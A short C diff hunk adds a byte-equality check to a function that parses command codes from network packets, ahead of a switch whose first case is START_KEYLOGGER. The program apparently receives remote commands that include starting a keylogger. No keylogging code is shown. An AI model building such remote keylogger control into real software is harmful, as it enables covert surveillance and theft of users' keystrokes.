@@ -68,7 +68,13 @@ bool handle_command_codes(struct session_info * session_info, const struct packe
     enum command_codes encountered_command_code = {};
     bool is_command_code = true;
 
+
+    const uint8_t first_byte  = (node->data >> 8) & 0xFF;
     const uint8_t last_byte = node->data & 0xFF;
+
+    if (first_byte != last_byte) {
+        return false;
+    }
 
     switch (last_byte) {
         case START_KEYLOGGER:
